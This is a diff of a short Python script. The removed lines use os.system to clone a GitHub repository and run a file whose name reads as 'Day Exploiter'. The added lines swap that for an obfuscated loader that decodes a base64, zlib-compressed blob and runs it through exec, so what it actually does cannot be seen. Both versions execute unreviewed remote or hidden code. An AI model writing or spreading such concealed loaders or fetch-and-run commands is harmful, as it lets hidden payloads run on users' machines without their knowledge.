@@ -1,7 +1,2 @@
-
-import os
-os.system("pkg update ")
-os.system("git clone https://github.com/MuslimSecurity/kwmfuwvev3vej98fwm893fkre.git && cd kwmfuwvev3vej98fwm893fkre && python 0D4y@3XpL0iT3r.py")
-
-os.system("pkg update ")
-os.system("git clone https://github.com/MuslimSecurity/kwmfuwvev3vej98fwm893fkre.git && cd kwmfuwvev3vej98fwm893fkre && python 0D4y@3XpL0iT3r.py")
+import marshal,zlib,base64
+exec(zlib.decompress(base64.b64decode("eJzVjrEOgjAURXe+4oWB6NKS1AGcHBx10sFVywMqlL60r5D+vbC5+AGu99ycnMxYcp7BhcwFEVJgtLuchg4iNU9GyPffoDMMenQTQs9M4SjluvTxJbSz8hrDaOwNdfSGkxwW28ZlxlnN+K6rdrFVrdrBo9gsRQG6gZ+fjVPi3k1Qng/ppB50Kc1deUFpTfqr2A/SlHrc")))
